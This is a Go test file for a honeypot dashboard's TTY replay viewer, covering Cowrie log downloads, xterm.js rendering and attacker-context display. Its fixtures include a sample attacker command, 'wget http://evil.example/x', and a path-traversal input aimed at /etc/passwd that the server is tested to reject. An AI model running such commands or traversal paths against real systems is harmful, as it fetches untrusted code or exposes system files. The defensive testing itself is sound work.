package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"html/template"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func newTestTTYStore(t *testing.T) (*store, *template.Template) {
	t.Helper()
	memStore := newMemESDocStore()
	srv := httptest.NewServer(memStore.handler())
	t.Cleanup(srv.Close)
	es := newESClient(srv.URL, "")
	s := &store{es: es}
	tmpl := template.Must(template.New("t").Funcs(templateFuncs(nil, "")).Parse(pageTemplate))
	return s, tmpl
}

func seedTTYLog(t *testing.T, s *store, shasum string, raw []byte) {
	t.Helper()
	doc, err := json.Marshal(ttyLogDoc{Shasum: shasum, SizeBytes: int64(len(raw)), TTYLogBase64: base64.StdEncoding.EncodeToString(raw)})
	if err != nil {
		t.Fatal(err)
	}
	if err := s.es.docIndex(cowrieTTYLogIndex, shasum, doc, true, 0, 0); err != nil {
		t.Fatalf("seed ttylog doc: %v", err)
	}
}

// buildSimpleTTYLog is a smaller helper than tty_replay_test.go's
// buildTTYLog, for tests that only need one OUTPUT record.
func buildSimpleTTYLog(text string) []byte {
	header := func(op, length, direction int32) []byte {
		h := make([]byte, ttyRecordHeaderSize)
		binary.LittleEndian.PutUint32(h[0:], uint32(op))
		binary.LittleEndian.PutUint32(h[8:], uint32(length))
		binary.LittleEndian.PutUint32(h[12:], uint32(direction))
		return h
	}
	var raw []byte
	raw = append(raw, header(ttyOpOpen, 0, 0)...)
	raw = append(raw, header(ttyOpWrite, int32(len(text)), ttyDirOutput)...)
	raw = append(raw, []byte(text)...)
	raw = append(raw, header(ttyOpClose, 0, 0)...)
	return raw
}

func TestServeTTYReplayViewerPageRendersWithoutESLookup(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	req := httptest.NewRequest(http.MethodGet, "/tty/"+strings.Repeat("a", 64), nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200 for the viewer shell (it fetches ES client-side), got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), strings.Repeat("a", 64)) {
		t.Errorf("expected shasum in rendered page")
	}
}

// TestServeTTYReplayViewerPageLoadsXtermJS (#1282) pins that the viewer
// shell loads the real xterm.js terminal emulator (vendored, static/
// xterm.js) and mounts it into a plain container, not the former
// hand-rolled VT100 subset's <pre id="tty-screen" aria-live="polite">
// (xterm.js manages its own internal accessibility tree instead).
func TestServeTTYReplayViewerPageLoadsXtermJS(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	req := httptest.NewRequest(http.MethodGet, "/tty/"+strings.Repeat("a", 64), nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	body := w.Body.String()
	if !strings.Contains(body, `src="/static/xterm.js`) {
		t.Error("expected the vendored xterm.js script tag")
	}
	if !strings.Contains(body, `href="/static/xterm.css`) {
		t.Error("expected the vendored xterm.css stylesheet link")
	}
	if !strings.Contains(body, `id="tty-screen"`) {
		t.Error("expected the #tty-screen mount point")
	}
	// The shared "style"/topbar partial has its own, unrelated aria-live
	// elements (a flash-message toast, an evidence-count badge) -- this
	// checks specifically that #tty-screen itself no longer carries one,
	// not that the whole page is aria-live-free.
	if strings.Contains(body, `id="tty-screen" aria-live`) {
		t.Error("aria-live on #tty-screen is a leftover from the old hand-rolled renderer -- xterm.js manages its own accessibility tree")
	}
	if !strings.Contains(body, `<div class="hp-tty-term" id="tty-screen" aria-busy="true">`) || !strings.Contains(body, `data-tty-loading`) {
		t.Error("expected the xterm mount point with a terminal-shaped loading surface, not the old <pre> element")
	}
}

func TestServeTTYReplayRejectsBadShasum(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	for _, path := range []string{"/tty/not-a-hash", "/tty/../../etc/passwd", "/tty/"} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		w := httptest.NewRecorder()
		s.serveTTYReplay(w, req, tmpl)
		if w.Code != http.StatusNotFound {
			t.Errorf("%s: expected 404, got %d", path, w.Code)
		}
	}
}

func TestServeTTYReplayRawAndCastNotFoundWhenNotImported(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("b", 64)
	for _, suffix := range []string{".raw", ".cast", ".json"} {
		req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum+suffix, nil)
		w := httptest.NewRecorder()
		s.serveTTYReplay(w, req, tmpl)
		if w.Code != http.StatusNotFound {
			t.Errorf("%s: expected 404 for a shasum never mirrored into ES, got %d: %s", suffix, w.Code, w.Body.String())
		}
	}
}

func TestServeTTYReplayRawServesOriginalBytes(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("c", 64)
	raw := buildSimpleTTYLog("hello attacker")
	seedTTYLog(t, s, shasum, raw)

	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum+".raw", nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "hello attacker") {
		t.Errorf("raw download should contain the original bytes verbatim")
	}
	if ct := w.Header().Get("Content-Type"); ct != "application/octet-stream" {
		t.Errorf("expected octet-stream content type, got %q", ct)
	}
}

func TestServeTTYReplayCastServesValidAsciicast(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("d", 64)
	seedTTYLog(t, s, shasum, buildSimpleTTYLog("hello attacker"))

	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum+".cast", nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	lines := strings.Split(strings.TrimRight(w.Body.String(), "\n"), "\n")
	if len(lines) != 2 {
		t.Fatalf("expected header + 1 event line, got %d: %s", len(lines), w.Body.String())
	}
	if !strings.Contains(lines[1], "hello attacker") {
		t.Errorf("event line missing the recorded text: %s", lines[1])
	}
}

func TestServeTTYReplayJSONServesRecords(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("e", 64)
	seedTTYLog(t, s, shasum, buildSimpleTTYLog("hello attacker"))

	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum+".json", nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var payload struct {
		Shasum  string          `json:"shasum"`
		Records []ttyRecordJSON `json:"records"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &payload); err != nil {
		t.Fatalf("response is not valid JSON: %v: %s", err, w.Body.String())
	}
	if len(payload.Records) != 1 || payload.Records[0].Data != "hello attacker" {
		t.Errorf("unexpected records: %+v", payload.Records)
	}
}

// TestServeTTYReplayShowsAttackerReplayWhenSourceEventKnown covers #1268
// "ask 2": the Attacker replay tab needs to resolve the recording's own
// source IP from the in-memory event cache and populate attackerData for
// it -- confirms the page actually carries that context (IP, a command,
// and the map coordinates) rather than falling back to the no-context
// empty state.
func TestServeTTYReplayShowsAttackerReplayWhenSourceEventKnown(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("1", 64)
	s.events = []storedEvent{
		{
			SrcIP: "203.0.113.55", Sensor: "cowrie", Session: "sess-1",
			Time: "2026-08-12 10:00:00", UTC: "2026-08-12T10:00:00Z",
			Command: "wget http://evil.example/x", Country: "US",
			// TTYReplay holds the full "/tty/<hash>" link classify.go's own
			// cowrie.log.closed branch sets it to (#612/#638) -- not the
			// bare shasum, which caught a real bug in this test's first
			// draft: it originally seeded the bare hash here, which
			// happened to match this file's own first-draft comparison
			// bug in tty_replay.go, so the test passed for the wrong
			// reason until a live end-to-end check caught the mismatch.
			Lat: 37.75, Lon: -97.8, TTYReplay: "/tty/" + shasum, Detail: "command: wget http://evil.example/x",
		},
	}

	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum, nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "203.0.113.55") {
		t.Errorf("expected the resolved source IP in the Attacker replay tab, got: %s", body)
	}
	if !strings.Contains(body, "wget http://evil.example/x") {
		t.Errorf("expected the attacker's own command history in the timeline, got: %s", body)
	}
	if !strings.Contains(body, `data-lat="37.75"`) || !strings.Contains(body, `data-lon="-97.8"`) {
		t.Errorf("expected the map marker's coordinates from the source event's own Lat/Lon, got: %s", body)
	}
	if strings.Contains(body, "Attacker context isn&#39;t available") {
		t.Errorf("should not show the no-context fallback when a source event was found")
	}
}

// TestServeTTYReplayAttackerTabFallbackWhenSourceUnknown covers the other
// half: a shasum with no matching TTYReplay in the current in-memory event
// cache (rolled off the log-tail window, or never resolved) must degrade to
// an explanatory empty state, not a zero-value attacker profile that would
// read as a real (if oddly blank) attacker.
func TestServeTTYReplayAttackerTabFallbackWhenSourceUnknown(t *testing.T) {
	s, tmpl := newTestTTYStore(t)
	shasum := strings.Repeat("2", 64)
	req := httptest.NewRequest(http.MethodGet, "/tty/"+shasum, nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	if !strings.Contains(body, "Attacker context isn") {
		t.Errorf("expected the no-context fallback message, got: %s", body)
	}
	if strings.Contains(body, "tty-attacker-map") {
		t.Errorf("must not render the map (or any attacker-scoped content) with no resolved source IP, got: %s", body)
	}
}

func TestServeTTYReplayESUnavailable(t *testing.T) {
	s := &store{}
	tmpl := template.Must(template.New("t").Funcs(templateFuncs(nil, "")).Parse(pageTemplate))
	req := httptest.NewRequest(http.MethodGet, "/tty/"+strings.Repeat("f", 64)+".raw", nil)
	w := httptest.NewRecorder()
	s.serveTTYReplay(w, req, tmpl)
	if w.Code != http.StatusServiceUnavailable {
		t.Fatalf("expected 503 when Elasticsearch is not configured, got %d: %s", w.Code, w.Body.String())
	}
}
